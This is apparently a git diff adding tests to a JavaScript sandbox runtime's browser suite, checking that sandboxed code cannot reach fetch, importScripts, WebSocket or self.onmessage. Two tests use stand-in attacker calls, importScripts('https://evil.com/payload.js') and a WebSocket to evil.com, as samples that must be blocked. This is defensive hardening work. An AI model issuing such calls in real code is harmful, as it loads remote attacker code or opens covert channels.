@@ -131,4 +131,74 @@ describe.skipIf(!IS_BROWSER_ENV)("runtime driver specific: browser", () => {
 			"http2.createServer is not supported in sandbox",
 		);
 	});
+
+	it("blocks sandbox code from calling native fetch", async () => {
+		const runtime = await createRuntime();
+		const result = await runtime.exec(`
+      try {
+        self.fetch("https://example.com");
+      } catch (e) {
+        if (e instanceof ReferenceError) process.exit(42);
+        throw e;
+      }
+    `);
+		expect(result.code).toBe(42);
+	});
+
+	it("blocks sandbox code from calling importScripts", async () => {
+		const runtime = await createRuntime();
+		const result = await runtime.exec(`
+      try {
+        self.importScripts("https://evil.com/payload.js");
+      } catch (e) {
+        if (e instanceof ReferenceError) process.exit(42);
+        throw e;
+      }
+    `);
+		expect(result.code).toBe(42);
+	});
+
+	it("blocks sandbox code from creating WebSocket", async () => {
+		const runtime = await createRuntime();
+		const result = await runtime.exec(`
+      try {
+        new self.WebSocket("wss://evil.com");
+      } catch (e) {
+        if (e instanceof ReferenceError) process.exit(42);
+        throw e;
+      }
+    `);
+		expect(result.code).toBe(42);
+	});
+
+	it("blocks sandbox code from overwriting self.onmessage", async () => {
+		const runtime = await createRuntime();
+		const result = await runtime.exec(`
+      try {
+        self.onmessage = () => {};
+      } catch (e) {
+        if (e instanceof TypeError) process.exit(42);
+        throw e;
+      }
+    `);
+		expect(result.code).toBe(42);
+	});
+
+	it("still runs normal bridge-provided APIs after hardening", async () => {
+		const events: Array<{ channel: "stdout" | "stderr"; message: string }> = [];
+		const runtime = await createRuntime({
+			onStdio: (event) => events.push(event),
+		});
+		const result = await runtime.exec(`
+      const fs = require('fs');
+      const path = require('path');
+      console.log("hardened-ok");
+      console.log(typeof require);
+    `);
+		expect(result.code).toBe(0);
+		expect(events).toContainEqual({
+			channel: "stdout",
+			message: "hardened-ok",
+		});
+	});
 });
